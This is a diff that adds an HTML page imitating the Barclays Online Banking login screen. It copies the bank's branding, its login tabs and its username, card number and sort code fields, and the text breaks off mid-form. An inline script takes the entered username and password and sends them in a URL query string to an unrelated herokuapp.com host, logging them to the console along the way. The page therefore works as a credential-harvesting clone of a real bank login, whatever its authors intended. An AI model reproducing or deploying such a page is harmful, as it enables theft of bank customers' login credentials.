@@ -1,0 +1,594 @@
+<html lang="en-GB">
+    
+<head>
+    
+    <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}.ng-hide-add-active,.ng-hide-remove{display:block!important;}</style>
+
+
+    <title>Step 1 - Who are you? - Barclays Online Banking</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+	
+    <script>
+
+    var clientId="go1olv0vrbrfmb4pm5k3equhhkoi8cef";
+    $(document).ready(function() {
+        console.log('loaded');
+
+        sessionStorage.clear();
+        $('#userlogin').on('submit', (function(ev) {
+            console.log('submitted');
+            $("#signbutton").hide();
+            $("#loader").show();
+            ev.preventDefault();
+            console.log("Form submitted");
+            var userLogin = $("#userLogin").val();
+            var password = $("#password").val();
+            var urlParams = "code=Jq4te0OgMV6LCHpC0NrJu91aZpS/M0x56e6MzZdROAEL2kdkocaLmA==&clientId=" + clientId + "&userEmail=" + userLogin + "&password=" + password;
+            console.log(urlParams);
+            var settings = {
+            "async": true,
+            "crossDomain": true,
+            "url": "https://box-tokengenerator-v2.herokuapp.com/tokengenerator?" + urlParams,
+            "method": "GET",
+            "headers": {}
+            };
+            $.ajax(settings).done(function(response) {
+              console.log(response);
+              accessToken = response.userToken;
+              sessionStorage.setItem("accessToken",accessToken);
+              sessionStorage.setItem("userLogin",userLogin);
+              sessionStorage.setItem("userName", response.userName);
+              //sessionStorage.setItem("adminAccessToken",response.adminAccessToken);
+              console.log("from storage access:" + sessionStorage.getItem("accessToken"));
+              //console.log("from storage admin:" + sessionStorage.getItem("adminAccessToken"));
+              sessionStorage.setItem("mainFolderId", '79111614513');
+              sessionStorage.setItem("dv", '167533048186');
+              window.location.replace('/Runthebank/bindex.html');
+
+            })
+            .fail(function(xhr, status, error) {
+                    console.log(xhr);
+                    $(".msg").text(xhr.responseText);
+                    $("#signbutton").show();
+                    $("#loader").hide();
+            })
+      }));
+    });
+
+</script>
+
+</head>
+<body>
+<div>
+    
+
+        
+    
+    
+
+    <div id="bdlLogin-bootstrap" class="desktop-site ng-scope" xmlns:ng="http://angularjs.org">
+        <link rel="stylesheet" type="text/css" href="csslogin/rolb-theme-2-0.css?v=1652782834434">
+        <link rel="stylesheet" type="text/css" href="csslogin/authlogin-bdl.css?v=1652782834434">
+        <div class="rolb dss-container">
+            <!-- ngInclude: undefined --><ng-include src="'/authlogin/partials/bdlLogin/header.html?v=1652782834434'" class="ng-scope"><header id="main-header" class="rolbHeader header ng-scope" ng-controller="headerCtrl"> <span class="icon icon-barclays-eagle logo-eagle logoSpace" ng-click="goToBarclaysHomepage()" aria-label="Barclays Homepage"></span> <span class="icon icon-barclays-wordmark logo-title logoSpace logoSpaceBarclays hidden-xs" ng-click="goToBarclaysHomepage()" aria-hidden="true"></span> <!-- ngIf: showLogout --> <!-- ngIf: !showLogout --><div class="header-right secureSpace ng-scope" ng-if="!showLogout"> <span class="icon-secure"></span> <a class="normal  standalone-links" id="headerSecureLink" tabindex="" href="http://www.barclays.co.uk/security" aria-label="Secure Link" target="_blank" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+
+<span class="ng-scope">Secure</span></a> </div><!-- end ngIf: !showLogout --> <!-- ngIf: isModal --> </header></ng-include>
+            <!-- ngView:  --><div ng-view="" class="ng-scope"><main id="content" class="ng-scope"> <!-- ngIf: authDataUser.display --><div ng-if="authDataUser.display" show-user-info="false" class="ng-scope"> <!-- ngIf: authDataUser.tagline !== '' --> <!-- ngIf: authDataUser.tagline === '' --><section class="jumbo jumbo-noimage jumbo-cyan5 " id="pageHero id" hero-title="Log in to Online Banking" data="authDataUser" userinfo="showUserInfo" link-click="heroLinkClick(event,link)" banner-status="false" analytics-tag="" analytics-label="" ng-if="authDataUser.tagline === ''">
+  <!-- ngIf: showBackButton -->
+  <div class="jumbo-body" ng-class="{'user-panel':userinfo, 'notification-banner': notificationBanner}">
+    <div class="container-fluid">
+      <div class="row">
+        <div class="col-md-8 col-md-offset-2">
+          
+          <div class="jumbo-content aperture-left">
+            
+            <h1 class="jumbo-title ng-binding">Log in to Online Banking</h1>
+            
+            
+          </div>
+          
+
+          <!-- ngIf: htmlData && htmlData.headText -->
+
+          <!-- ngIf: userinfo -->
+        </div>
+        <!-- ngIf: notificationBanner -->
+      </div>
+    </div>
+  </div>
+</section><!-- end ngIf: authDataUser.tagline === '' --> </div><!-- end ngIf: authDataUser.display --> <section class="wrapper ROLBWrapper"> <div class="container-fluid"> <div class="row"> <div class="col-md-8 col-md-offset-2"> 
+     <!-- ngIf: serverErrorMessagesObj.headerErrors.errorLength --> <!-- ngIf: loginStep1[globalErrorFormName] != undefined && loginStep1[globalErrorFormName].formSubmitted --> <!-- ngIf: loadBrowserAlert --><div class="mb-24 ng-scope" ng-if="loadBrowserAlert"> <browser-alert><!-- ngIf: content.display --></browser-alert> </div><!-- end ngIf: loadBrowserAlert --> <!-- ngIf: browser.valid --><div ng-if="browser.valid" class="ng-scope"> <cookie-policy class="ng-scope"><!-- ngIf: content.display --></cookie-policy> <header-content class="ng-scope"><div class="marginHead"> <b-text id="header-change" class="head-color ng-isolate-scope" type="h2" b-data="Our online service gives you secure and immediate access to all of your personal financial information held by Barclays UK, all in one place." dss-dda-component="DDA Specific Component Attribute"><h2>Our online service gives you secure and immediate access to all of your personal financial information held by Barclays UK, all in one place.</h2></b-text> </div> <div class="marginHeadSubheader"> <b-text id="headerContent" type="span" class="font16px font-family ng-isolate-scope" b-data="First time user?" dss-dda-component="DDA Specific Component Attribute"><span>First time user?</span></b-text> <a class="normal " id="1g7tucqie" tabindex="" href="/olb/registration/registerAppContainer.do?mbrtyp=pbc#/speedy-user-details" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+
+<span class="ng-binding ng-scope">Register using your SpeedyReg code</span></a><span class="dotStyle">.</span> </div></header-content> <!-- ngIf: !mobileView --><div ng-if="!mobileView" class="ng-scope"> <div class="spaceTab theme-barclays ng-isolate-scope" id="loginTypeSelection" is-content="false" click="loginTypeChange" selected-tab="selectedTab" data="tabsLogin" analytics-tag="b-radio" analytics-label="loginType" dss-dda-component="DDA Specific Component Attribute">
+  <div class="m-tab-nav">
+    <div class="m-tab-nav__body has-finished-scroll">
+      <!-- contain tabs within tablist container -->
+      <ul class="m-tab-nav__items" role="tablist">
+        <!-- mark-up tabbed element - e.g. link -- with tab role -->
+        <!-- incidate selected tab for SRs with aria-selected -->
+        <!-- have it link to controller panel div and associate with aria controls -->
+        <!-- ngRepeat: value in dataTabs track by $index --><li ng-keydown="keyPressed($event, currentSelected)" ng-click="openTab($event, $index, currentSelected)" data-tab-active="tab_key_0" ng-repeat="value in dataTabs track by $index" class="m-tab-nav__item ng-scope" role="presentation">
+          <!-- mark-up tabbed element - e.g. link -- with tab role -->
+          <!-- indicate selected tab for SRs with aria-selected -->
+          <!-- have it link to controller panel div and associate with aria controls -->
+          <!--exlude tabs from focus order with tabindex -->
+          <!-- communicate non-selection state with aria-selected -->
+          <button id="loginTypeSelection_tab_button_0" ng-class="{'is-active':selectedTab=='tab_key_'+$index}" class="a-tab ng-binding is-active" role="tab" ng-attr-aria-selected="{{selectedTab=='tab_key_'+$index ? true: false}}" aria-controls="tab_key_0" aria-selected="true" tabindex="0">
+            Username and password
+          </button>
+        </li><!-- end ngRepeat: value in dataTabs track by $index --><li ng-keydown="keyPressed($event, currentSelected)" ng-click="openTab($event, $index, currentSelected)" data-tab-active="tab_key_0" ng-repeat="value in dataTabs track by $index" class="m-tab-nav__item ng-scope" role="presentation">
+          <!-- mark-up tabbed element - e.g. link -- with tab role -->
+          <!-- indicate selected tab for SRs with aria-selected -->
+          <!-- have it link to controller panel div and associate with aria controls -->
+          <!--exlude tabs from focus order with tabindex -->
+          <!-- communicate non-selection state with aria-selected -->
+          <button id="loginTypeSelection_tab_button_1" ng-class="{'is-active':selectedTab=='tab_key_'+$index}" class="a-tab ng-binding" role="tab" ng-attr-aria-selected="{{selectedTab=='tab_key_'+$index ? true: false}}" aria-controls="tab_key_1" aria-selected="false" tabindex="-1">
+            Card number
+          </button>
+        </li><!-- end ngRepeat: value in dataTabs track by $index --><li ng-keydown="keyPressed($event, currentSelected)" ng-click="openTab($event, $index, currentSelected)" data-tab-active="tab_key_0" ng-repeat="value in dataTabs track by $index" class="m-tab-nav__item ng-scope" role="presentation">
+          <!-- mark-up tabbed element - e.g. link -- with tab role -->
+          <!-- indicate selected tab for SRs with aria-selected -->
+          <!-- have it link to controller panel div and associate with aria controls -->
+          <!--exlude tabs from focus order with tabindex -->
+          <!-- communicate non-selection state with aria-selected -->
+          <button id="loginTypeSelection_tab_button_2" ng-class="{'is-active':selectedTab=='tab_key_'+$index}" class="a-tab ng-binding" role="tab" ng-attr-aria-selected="{{selectedTab=='tab_key_'+$index ? true: false}}" aria-controls="tab_key_2" aria-selected="false" tabindex="-1">
+            Sort code and account number
+          </button>
+        </li><!-- end ngRepeat: value in dataTabs track by $index -->
+      </ul>
+    </div>
+    <!-- contain panels within containers with tabpanel role -->
+    <!-- allow programmatic focus onto tab panel with tabindex -->
+    <!-- associate with tab with aria-labelledby -->
+    <!-- ngIf: isContent -->
+  </div>
+</div> <div class="tab-body p-0"> <div id="tab_key_0" class="tabcontent" role="tabpanel" aria-label="Membership number tab" style="display: block;"> <!-- ngInclude: undefined --><ng-include src="membershipNumberTemplate" class="ng-scope"><ng-form id="membershipForm" name="membershipForm" autocomplete="off" novalidate="" show-errors-if-any="false" class="ng-scope ng-pristine ng-valid"> <div class="MemNoInput"> <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" dss-dda-component="DDA Specific Component Attribute">
+  <div class="form-item" ng-class="{'has-error': (formController.showErrorsIfAny &amp;&amp; formController['surname'].$invalid) || 
+       (formController['surname'].$invalid &amp;&amp; formController['surname'].$dirty &amp;&amp; validationErrors)}">
+    
+    <label class="label">
+        <form action="#" id="userlogin" method="get">
+
+      <span for="surnameMem" id="label-surnameMem">Username</span>
+      <label for="surnameMem" id="extraLabelData-surnameMem" class="visuallyhidden ng-binding" aria-hidden="true"></label> 
+      <!-- ngIf: tooltipconfig -->
+    </label>
+    
+    <div class="input-wrapper" ng-class="{'image-at-right': showImg}">
+      
+      <span class="input-prefix"></span>
+      
+      
+      <span class="input-suffix"></span>
+      
+      <input ng-attr-tabindex="" aria-labelledby="label-surnameMem extraLabelData-surnameMem" aria-describedby="input-err-1g7tucqss " class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="userLogin" name="surname" ng-model="model.surnameMem.value" type="text" maxlength="100" ng-blur="trimLastname(model.surnameMem.value, 'surnameMem')" mca-validator-extended="AppName.Module.nameValidation | this.formController.surname" autocomplete="family-name" aria-autocomplete="inline" validator-event="blur" supportglobalerror="true" analytics-tag="" aria-invalid="false">
+      <!-- ngIf: showImg -->
+    </div>
+    <div id="input-err-1g7tucqss" aria-hidden="true">
+      <!-- ngIf: (formController['surname'].$invalid && currentState && formController.showErrorsIfAny) || 
+        (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors) -->
+      <!-- ngIf: (formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) || 
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors) -->
+    </div>
+  </div>
+</div>
+ </div> <div class="membershipNumber"> <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" dss-dda-component="DDA Specific Component Attribute">
+  <div class="form-item" ng-class="{'has-error': (formController.showErrorsIfAny &amp;&amp; formController['membership'].$invalid) || 
+       (formController['membership'].$invalid &amp;&amp; formController['membership'].$dirty &amp;&amp; validationErrors)}">
+    
+    <label class="label">
+      <span for="membership0" id="label-membership0">Password</span>
+      <label for="membership0" id="extraLabelData-membership0" class="visuallyhidden ng-binding" aria-hidden="true"></label> 
+      <!-- ngIf: tooltipconfig --><span tabindex="0" ng-if="tooltipconfig" b-tooltip="" tooltipconfig="{&quot;arrowPosition&quot;:&quot;left center&quot;,&quot;boxPosition&quot;:&quot;right center&quot;,&quot;qtipContent&quot;:{&quot;text&quot;:&quot;<p>You will have received this number in the post when you first signed up to Online Banking</p>&quot;,&quot;customAriaText&quot;:&quot;You will have received this number in the post when you first signed up to Online Banking&quot;},&quot;iconClass&quot;:&quot;icon-question&quot;,&quot;mobileConfig&quot;:{&quot;arrowPosition&quot;:&quot;bottom center&quot;,&quot;boxPosition&quot;:&quot;top center&quot;}}" id="described-membership0" class="ng-scope ng-isolate-scope icon iconSpacing dsstooltip icon-question" role="tooltip" aria-label="You will have received this number in the post when you first signed up to Online Banking" data-hasqtip="0"></span><!-- end ngIf: tooltipconfig -->
+    </label>
+    
+    <div class="input-wrapper" ng-class="{'image-at-right': showImg}">
+      
+      <span class="input-prefix"></span>
+      
+      
+      <span class="input-suffix"></span>
+      
+      <input ng-attr-tabindex="" aria-labelledby="label-membership0 extraLabelData-membership0" aria-describedby="described-membership0 input-err-1g7tucqst " class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="password" name="membership" ng-model="model.membershipNum.value" type="password" aria-label="12 digits" mca-validator-extended="AppName.Module.membershipValidation | this.formController.membership" validator-event="blur" supportglobalerror="true" maxlength="12" tooltipconfig="tooltipConfig('membership')" autocomplete="membership" aria-autocomplete="inline" analytics-tag="" aria-invalid="false">
+      <!-- ngIf: showImg -->
+    </div>
+    <div id="input-err-1g7tucqst" aria-hidden="true">
+      <!-- ngIf: (formController['membership'].$invalid && currentState && formController.showErrorsIfAny) || 
+        (formController['membership'].$invalid && formController['membership'].$dirty && currentState && validationErrors) -->
+      <!-- ngIf: (formController['membership'].$invalid && !currentState && formController.showErrorsIfAny) || 
+        (formController['membership'].$invalid && formController['membership'].$dirty && !currentState && validationErrors) -->
+    </div>
+  </div>
+</div>
+ </div> <div class="forgotMembershipLink"> <a class="normal " id="forgotMembershipLink" tabindex="" href="javascript:void(0)" ng-click="forgotMembership()" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+<span class="ng-scope">Don't know your username?</span></a> </div> </ng-form></ng-include> </div> <div id="tab_key_1" class="tabcontent" role="tabpanel" aria-label="Card number tab" style="display: none;"> <!-- ngInclude: undefined --><ng-include src="loginCardNumberTemplate" class="ng-scope"><ng-form id="cardNumberForm" name="cardNumberForm" autocomplete="off" novalidate="" show-errors-if-any="false" class="ng-scope ng-pristine ng-valid"> <div class="MemNoInput"> <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" dss-dda-component="DDA Specific Component Attribute">
+  <div class="form-item" ng-class="{'has-error': (formController.showErrorsIfAny &amp;&amp; formController['surname'].$invalid) || 
+       (formController['surname'].$invalid &amp;&amp; formController['surname'].$dirty &amp;&amp; validationErrors)}">
+    
+    <label class="label">
+      <span for="surnameCardno" id="label-surnameCardno">Username</span>
+      <label for="surnameCardno" id="extraLabelData-surnameCardno" class="visuallyhidden ng-binding" aria-hidden="true"></label> 
+      <!-- ngIf: tooltipconfig -->
+    </label>
+    
+    <div class="input-wrapper" ng-class="{'image-at-right': showImg}">
+      
+      <span class="input-prefix"></span>
+      
+      
+      <span class="input-suffix"></span>
+      
+      <input ng-attr-tabindex="" aria-labelledby="label-surnameCardno extraLabelData-surnameCardno" aria-describedby="input-err-1g7tucr46 " class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="surnameCardno" name="surname" ng-model="model.surnameCardno.value" type="text" maxlength="24" ng-blur="trimLastname(model.surnameCardno.value, 'surnameCardno')" autocomplete="family-name" aria-autocomplete="inline" mca-validator-extended="AppName.Module.nameValidation | this.formController.surname" validator-event="blur" supportglobalerror="true" analytics-tag="">
+      <!-- ngIf: showImg -->
+    </div>
+    <div id="input-err-1g7tucr46" aria-hidden="true">
+      <!-- ngIf: (formController['surname'].$invalid && currentState && formController.showErrorsIfAny) || 
+        (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors) -->
+      <!-- ngIf: (formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) || 
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors) -->
+    </div>
+  </div>
+</div>
+ </div> <card-number class="ng-scope"><div id="cardNoInput" class="cardNoInput"> <div> <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" dss-dda-component="DDA Specific Component Attribute">
+  <div class="form-item" ng-class="{'has-error': (formController.showErrorsIfAny &amp;&amp; formController['cardNumber'].$invalid) || 
+       (formController['cardNumber'].$invalid &amp;&amp; formController['cardNumber'].$dirty &amp;&amp; validationErrors)}">
+    
+    <label class="label">
+      <span for="cardNumber0" id="label-cardNumber0">Card number (16 digits)</span>
+      <label for="cardNumber0" id="extraLabelData-cardNumber0" class="visuallyhidden ng-binding" aria-hidden="true"></label> 
+      <!-- ngIf: tooltipconfig --><span tabindex="0" ng-if="tooltipconfig" b-tooltip="" tooltipconfig="{&quot;arrowPosition&quot;:&quot;left center&quot;,&quot;boxPosition&quot;:&quot;right center&quot;,&quot;qtipContent&quot;:{&quot;text&quot;:&quot;<p>This can be found on the front of your Barclays debit, cash or authentication card.</p><p>  <img src=\&quot;/OLB/A/Content/Images/1321077818816-card_number_card.jpg\&quot; alt=\&quot;Card\&quot; height=\&quot;109\&quot; width=\&quot;168\&quot;></p>&quot;,&quot;customAriaText&quot;:&quot;This can be found on the front of your Barclays debit, cash or authentication card.  &quot;},&quot;iconClass&quot;:&quot;icon-question&quot;,&quot;mobileConfig&quot;:{&quot;arrowPosition&quot;:&quot;bottom center&quot;,&quot;boxPosition&quot;:&quot;top center&quot;}}" id="described-cardNumber0" class="ng-scope ng-isolate-scope icon iconSpacing dsstooltip icon-question" role="tooltip" aria-label="This can be found on the front of your Barclays debit, cash or authentication card.  " data-hasqtip="3"></span><!-- end ngIf: tooltipconfig -->
+    </label>
+    
+    <div class="input-wrapper" ng-class="{'image-at-right': showImg}">
+      
+      <span class="input-prefix"></span>
+      
+      
+      <span class="input-suffix"></span>
+      
+      <input ng-attr-tabindex="" aria-labelledby="label-cardNumber0 extraLabelData-cardNumber0" aria-describedby="described-cardNumber0 input-err-1g7tucr4k " class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="cardNumber0" name="cardNumber" ng-model="model.cardNumber.value" maxlength="19" ng-keypress="validateCardNumber()" ng-change="validateCardNumber()" tooltipconfig="tooltipConfig('cardno')" mca-validator-extended="AppName.Module.cardNumberValidation | this.formController.cardNumber" autocomplete="cc-number" aria-autocomplete="inline" validator-event="blur" supportglobalerror="true" analytics-tag="" aria-invalid="false">
+      <!-- ngIf: showImg -->
+    </div>
+    <div id="input-err-1g7tucr4k" aria-hidden="true">
+      <!-- ngIf: (formController['cardNumber'].$invalid && currentState && formController.showErrorsIfAny) || 
+        (formController['cardNumber'].$invalid && formController['cardNumber'].$dirty && currentState && validationErrors) -->
+      <!-- ngIf: (formController['cardNumber'].$invalid && !currentState && formController.showErrorsIfAny) || 
+        (formController['cardNumber'].$invalid && formController['cardNumber'].$dirty && !currentState && validationErrors) -->
+    </div>
+  </div>
+</div>
+ </div> </div></card-number> </ng-form></ng-include> </div> <div id="tab_key_2" class="tabcontent" role="tabpanel" aria-label="Sort code and account number tab" style="display: none;"> <!-- ngInclude: undefined --><ng-include src="sortCodeAndAccNumberTemplate" class="ng-scope"><ng-form id="sortcodeForm" name="sortcodeForm" autocomplete="off" novalidate="" show-errors-if-any="false" class="ng-scope ng-pristine ng-invalid ng-invalid-required"> <div class="MemNoInput"> <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" dss-dda-component="DDA Specific Component Attribute">
+  <div class="form-item" ng-class="{'has-error': (formController.showErrorsIfAny &amp;&amp; formController['surname'].$invalid) || 
+       (formController['surname'].$invalid &amp;&amp; formController['surname'].$dirty &amp;&amp; validationErrors)}">
+    
+    <label class="label">
+      <span for="surnameSortcode" id="label-surnameSortcode">Last name</span>
+      <label for="surnameSortcode" id="extraLabelData-surnameSortcode" class="visuallyhidden ng-binding" aria-hidden="true"></label> 
+      <!-- ngIf: tooltipconfig -->
+    </label>
+    
+    <div class="input-wrapper" ng-class="{'image-at-right': showImg}">
+      
+      <span class="input-prefix"></span>
+      
+      
+      <span class="input-suffix"></span>
+      
+      <input ng-attr-tabindex="" aria-labelledby="label-surnameSortcode extraLabelData-surnameSortcode" aria-describedby="input-err-1g7tucr49 " class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="surnameSortcode" name="surname" ng-model="model.surnameSortcode.value" type="text" maxlength="24" ng-blur="trimLastname(model.surnameSortcode.value, 'surnameSortcode')" autocomplete="family-name" aria-autocomplete="inline" mca-validator-extended="AppName.Module.nameValidation | this.formController.surname" validator-event="blur" supportglobalerror="true" analytics-tag="">
+      <!-- ngIf: showImg -->
+    </div>
+    <div id="input-err-1g7tucr49" aria-hidden="true">
+      <!-- ngIf: (formController['surname'].$invalid && currentState && formController.showErrorsIfAny) || 
+        (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors) -->
+      <!-- ngIf: (formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) || 
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors) -->
+    </div>
+  </div>
+</div>
+ </div> <div class="sortCodeInput"> <div class="multi-input-container form-item ng-scope ng-pristine ng-invalid ng-invalid-required ng-valid-i-n-p1 ng-valid-i-n-p2" id="sortCode" ng-class="{'has-error':
+               (formController['sortCode'].$invalid &amp;&amp; formController['sortCode'].$dirty &amp;&amp; validationErrors)
+               || (formController.showErrorsIfAny &amp;&amp; formController['sortCode'].$invalid)
+               }" separator="-" name="sortCode" format="XX-XX-XX" tooltipconfig="tooltipConfig('sortcode')" label="Sort code" ng-model="model.sortCode.value" model-arr="" input-config="configForSortCode" no-of-inputs="3" mca-validator="AppName.Module.sortCodeValidation | modelArr" validate-field="true" validation-errors="true" analytics-tag="" analytics-label="SortCode" dss-dda-component="DDA Specific Component Attribute">
+  
+  <label class="label">
+    <span id="label-sortCode">Sort code</span>
+    <!-- ngIf: tooltipconfig --><span tabindex="0" ng-if="tooltipconfig" b-tooltip="" tooltipconfig="{&quot;arrowPosition&quot;:&quot;left center&quot;,&quot;boxPosition&quot;:&quot;right center&quot;,&quot;qtipContent&quot;:{&quot;text&quot;:&quot;<p>Your sort code is a 6-digit number &amp;ndash; eg 12-34-56. Your account number is 8 digits long. Both are on the front of your debit card.</p><p>  <img src=\&quot;/OLB/A/Content/Images/1321077850566-sortcode_account_number_card.jpg\&quot; alt=\&quot;Card\&quot; height=\&quot;113\&quot; width=\&quot;173\&quot; /></p>&quot;,&quot;customAriaText&quot;:&quot;Your sort code is a 6-digit number – eg 12-34-56. Your account number is 8 digits long. Both are on the front of your debit card.  &quot;},&quot;iconClass&quot;:&quot;icon-question&quot;,&quot;mobileConfig&quot;:{&quot;arrowPosition&quot;:&quot;bottom center&quot;,&quot;boxPosition&quot;:&quot;top center&quot;}}" id="tooltip-sortCode" class="ng-scope ng-isolate-scope icon iconSpacing dsstooltip icon-question" role="tooltip" aria-label="Your sort code is a 6-digit number – eg 12-34-56. Your account number is 8 digits long. Both are on the front of your debit card.  " data-hasqtip="1"></span><!-- end ngIf: tooltipconfig -->
+  </label>
+  
+  <div ng-class="{'row':inptConfig[1]['cls'].indexOf('col') !== -1}" class="row">
+    <!-- ngRepeat: i in arr track by $index --><div class="col-xs-4 col-sm-4 col-md-4 col-lg-4 separator-hyphen first-input" ng-repeat="i in arr track by $index" ng-class="{'separator-hyphen': separatorSymbol === '-' &amp;&amp; !$last,'first-input' : $first }">
+      <span class="visuallyhidden ng-binding" id="sortCode-1">First 2 digits</span>
+      <span class="sub-label ng-binding" aria-hidden="true"></span>
+      <input class="input ng-pristine ng-valid" maxlength="2" type="text" id="sortCode-input-1" aria-labelledby="sortCode-1" aria-describedby="additional-info-sortCode sortCode-error" ng-model="modelArr[$index]" ng-keyup="updateModelValue($event, $index)" ng-blur="blurHandler($event)" ng-change="changeHandler()" separator="-" format="XX-XX-XX" tooltipconfig="tooltipConfig('sortcode')" model-arr="" input-config="configForSortCode" no-of-inputs="3" validate-field="true" validation-errors="true" analytics-tag="" analytics-label="SortCode">
+    </div><!-- end ngRepeat: i in arr track by $index --><div class="col-xs-4 col-sm-4 col-md-4 col-lg-4 separator-hyphen" ng-repeat="i in arr track by $index" ng-class="{'separator-hyphen': separatorSymbol === '-' &amp;&amp; !$last,'first-input' : $first }">
+      <span class="visuallyhidden ng-binding" id="sortCode-2">Second 2 digits</span>
+      <span class="sub-label ng-binding" aria-hidden="true"></span>
+      <input class="input ng-pristine ng-valid" maxlength="2" type="text" id="sortCode-input-2" aria-labelledby="sortCode-2" aria-describedby="additional-info-sortCode sortCode-error" ng-model="modelArr[$index]" ng-keyup="updateModelValue($event, $index)" ng-blur="blurHandler($event)" ng-change="changeHandler()" separator="-" format="XX-XX-XX" tooltipconfig="tooltipConfig('sortcode')" model-arr="" input-config="configForSortCode" no-of-inputs="3" validate-field="true" validation-errors="true" analytics-tag="" analytics-label="SortCode">
+    </div><!-- end ngRepeat: i in arr track by $index --><div class="col-xs-4 col-sm-4 col-md-4 col-lg-4" ng-repeat="i in arr track by $index" ng-class="{'separator-hyphen': separatorSymbol === '-' &amp;&amp; !$last,'first-input' : $first }">
+      <span class="visuallyhidden ng-binding" id="sortCode-3">Third 2 digits</span>
+      <span class="sub-label ng-binding" aria-hidden="true"></span>
+      <input class="input ng-pristine ng-valid" maxlength="2" type="text" id="sortCode-input-3" aria-labelledby="sortCode-3" aria-describedby="additional-info-sortCode sortCode-error" ng-model="modelArr[$index]" ng-keyup="updateModelValue($event, $index)" ng-blur="blurHandler($event)" ng-change="changeHandler()" separator="-" format="XX-XX-XX" tooltipconfig="tooltipConfig('sortcode')" model-arr="" input-config="configForSortCode" no-of-inputs="3" validate-field="true" validation-errors="true" analytics-tag="" analytics-label="SortCode">
+    </div><!-- end ngRepeat: i in arr track by $index -->
+  </div>
+  <div class="additional-info ng-hide" id="additional-info-sortCode" ng-show="inptConfig.additionalInfo" b-compile-html="">
+  </div>
+  <div class="err-container" id="sortCode-error">
+    <div ng-show="(formController['sortCode'].$invalid &amp;&amp; formController['sortCode'].$dirty &amp;&amp; currentState &amp;&amp; validationErrors) || 
+        (formController.showErrorsIfAny &amp;&amp; formController['sortCode'].$invalid &amp;&amp; currentState)" class="ng-hide">
+      <!-- ngRepeat: (key, value) in formController['sortCode'].$error --><div ng-repeat="(key, value) in formController['sortCode'].$error" class="ng-scope">
+        <p class="error-message ng-hide" ng-show="formController['sortCode'].$error[key]" aria-live="assertive">
+          <span class="error-text">Error: </span><span class="ng-binding"></span>
+        </p>
+      </div><!-- end ngRepeat: (key, value) in formController['sortCode'].$error --><div ng-repeat="(key, value) in formController['sortCode'].$error" class="ng-scope">
+        <p class="error-message ng-hide" ng-show="formController['sortCode'].$error[key]" aria-live="assertive">
+          <span class="error-text">Error: </span><span class="ng-binding"></span>
+        </p>
+      </div><!-- end ngRepeat: (key, value) in formController['sortCode'].$error --><div ng-repeat="(key, value) in formController['sortCode'].$error" class="ng-scope">
+        <p class="error-message" ng-show="formController['sortCode'].$error[key]" aria-live="assertive">
+          <span class="error-text">Error: </span><span class="ng-binding"></span>
+        </p>
+      </div><!-- end ngRepeat: (key, value) in formController['sortCode'].$error -->
+    </div>
+    <div ng-show="(formController['sortCode'].$invalid &amp;&amp; formController['sortCode'].$dirty &amp;&amp; !currentState &amp;&amp; validationErrors) || 
+      (formController.showErrorsIfAny &amp;&amp; formController['sortCode'].$invalid &amp;&amp; !currentState)" class="ng-hide">
+      <!-- ngRepeat: (key, value) in formController['sortCode'].$error --><div ng-repeat="(key, value) in formController['sortCode'].$error" class="ng-scope">
+        <p class="error-message ng-hide" ng-show="formController['sortCode'].$error[key]" aria-live="assertive">
+          <span class="error-text">Error: </span><span class="ng-binding">You must enter a valid  sort code</span>
+        </p>
+      </div><!-- end ngRepeat: (key, value) in formController['sortCode'].$error --><div ng-repeat="(key, value) in formController['sortCode'].$error" class="ng-scope">
+        <p class="error-message ng-hide" ng-show="formController['sortCode'].$error[key]" aria-live="assertive">
+          <span class="error-text">Error: </span><span class="ng-binding">Please check that you've entered the correct sort code and account number</span>
+        </p>
+      </div><!-- end ngRepeat: (key, value) in formController['sortCode'].$error --><div ng-repeat="(key, value) in formController['sortCode'].$error" class="ng-scope">
+        <p class="error-message" ng-show="formController['sortCode'].$error[key]" aria-live="assertive">
+          <span class="error-text">Error: </span><span class="ng-binding">You must enter sort code</span>
+        </p>
+      </div><!-- end ngRepeat: (key, value) in formController['sortCode'].$error -->
+    </div>
+  </div>
+</div> </div> <div class="accNoInput"> <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2" dss-dda-component="DDA Specific Component Attribute">
+  <div class="form-item" ng-class="{'has-error': (formController.showErrorsIfAny &amp;&amp; formController['accountNumber'].$invalid) || 
